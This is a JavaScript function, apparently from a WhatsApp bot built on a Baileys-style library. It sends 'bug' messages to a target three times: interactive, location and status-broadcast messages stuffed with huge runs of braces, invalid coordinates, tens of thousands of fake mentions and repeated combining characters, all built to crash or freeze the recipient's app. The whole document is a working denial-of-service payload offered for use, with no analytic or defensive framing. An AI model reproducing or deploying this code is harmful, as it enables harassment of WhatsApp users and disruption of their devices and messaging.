async function VerloadSuperXx(target) {
for (let i = 0; i < 3; i++) {
    try {
      let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: 'VaxzyAnonymos🐉\\>',
                locationMessage: {
                  degreesLatitude: 999.99999990,
                  degreesLongitude: -99999999,
                  name: '{'.repeat(80000),
                  address: '{'.repeat(50000),
                },
                locationMessageV2: {
                  degreesLatitude: 250208,
                  degreesLongitude: -250208,
                  name: '{'.repeat(90000),
                  address: '{'.repeat(80000),
                },
              },
              body: {
                title: '',
              },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(80000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net",
                mentionedJid: [
                  "13135550002@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                  )
                  ],
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveMessage: {
                        body: {
                          text: "VaxzyAnonymos🐉",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "galaxy_message",
                          paramsJson: "{".repeat(9000),
                          version: 3
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }, {});
      
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
      });
      
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg1 = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
    });
    
    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
    console.log(`Sukses send bug To : ${target} ${i}×`);
  } catch (err) {
      console.log(err);
    }
  }
}